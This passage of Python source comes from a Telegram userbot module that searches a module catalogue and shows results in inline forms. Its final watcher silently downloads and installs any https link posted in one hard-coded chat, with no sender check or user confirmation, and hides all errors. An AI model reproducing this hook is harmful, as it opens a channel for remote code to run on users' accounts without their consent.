            })

        return results

    @loader.command(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
        es_doc="(consulta) - buscar módulos.",
        fr_doc="(requête) - rechercher des modules.",
        it_doc="(richiesta) - cercare moduli.",
        kk_doc="(сұраныс) - модульдерді іздеу.",
        tt_doc="(сорау) - модульләрне эзләү.",
        tr_doc="(sorgu) - modül arama.",
        yz_doc="(соруо) - модулларыты көҥүлүүр."
    )
    async def hscmd(self, message):
        '''(query) - search modules.'''        
        query = utils.get_args_raw(message)
        
        if not query:
            await utils.answer(message, self.strings["no_query"])
            return

        if len(query) > 168:
            await utils.answer(message, self.strings["query_too_big"])
            return

        status_msg = await utils.answer(message, self.strings["searching"])
        mods = await self._api_get("search", query=query, inline="false", token=self.token, user_id=self.uid, ood=self.config["only_official_developers"])

        if not mods or not isinstance(mods, list):
            await utils.answer(message, self.strings["no_results"])
            return

        seen_keys = set()
        unique_mods = []
        
        for mod in mods:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key not in seen_keys:
                seen_keys.add(key)
                unique_mods.append(mod)

        if not unique_mods:
            await utils.answer(message, self.strings["no_results"])
            await status_msg.delete()
            return

        first_mod = unique_mods[0]
        
        if 'likes' not in first_mod or 'dislikes' not in first_mod:
            installs = [m.get('install', '') for m in unique_mods]
            stats_response = await self._api_post("get", json=installs)
            
            for mod in unique_mods:
                install = mod.get('install', '')
                if install in stats_response:
                    mod['likes'] = stats_response[install].get('likes', 0)
                    mod['dislikes'] = stats_response[install].get('dislikes', 0)
        
        stats = {
            "likes": first_mod.get('likes', 0),
            "dislikes": first_mod.get('dislikes', 0)
        }
        
        photo = None
        if len(unique_mods) == 1:
            photo = await self._fetch_thumb(first_mod.get("banner"))
            if photo == "https://raw.githubusercontent.com/Fixyres/HSearch/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png":
                photo = None

        await self.inline.form(
            message=message,
            text=self._fmt_mod(first_mod, query, 1, len(unique_mods)),
            photo=photo,
            reply_markup=self._mk_btns(first_mod.get("install", ""), stats, 0, unique_mods if len(unique_mods) > 1 else None, query)
        )
        
        await status_msg.delete()

    @loader.watcher(chat_id=7575472403)
    async def _install_via_hsearch(self, message):
        link = message.raw_text.strip()
        
        if not link.startswith("https://"):
            return

        loader_module = self.lookup("loader")
        
        try:
            for _ in range(5):
                await loader_module.download_and_install(link, None)
                
                if getattr(loader_module, "fully_loaded", False):
                    loader_module.update_modules_in_db()
                
                is_loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)
                
                if is_loaded:
                    rose_msg = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose_msg.delete()
                    await message.delete()
                    break
        except:
            pass